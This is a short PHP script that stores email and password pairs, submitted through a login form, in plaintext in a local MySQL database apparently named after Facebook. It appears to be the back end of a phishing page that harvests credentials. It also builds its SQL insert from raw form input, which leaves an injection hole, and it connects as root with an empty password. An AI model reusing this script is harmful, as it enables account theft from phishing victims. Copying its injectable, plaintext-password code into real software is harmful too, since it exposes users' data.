<?php
	$servidor="localhost";
	$usuario="root";
	$clave="";
	$baseDeDatos="prueba_face";

	$enlace = mysqli_connect($servidor,$usuario,$clave,$baseDeDatos);

	if(!$enlace){
		echo"Error en la conexion con el servidor";
	}

	if(isset($_POST['entrar'])){
		$correo =$_POST["correo"];
		$contra =$_POST["contra"];

		$insertarDatos="INSERT INTO datos VALUES('$correo','$contra')";

		$ejecutarinsertar = mysqli_query($enlace, $insertarDatos);

		if(!$ejecutarinsertar){
			echo"Error en la linea de sql";
		}
	}
?>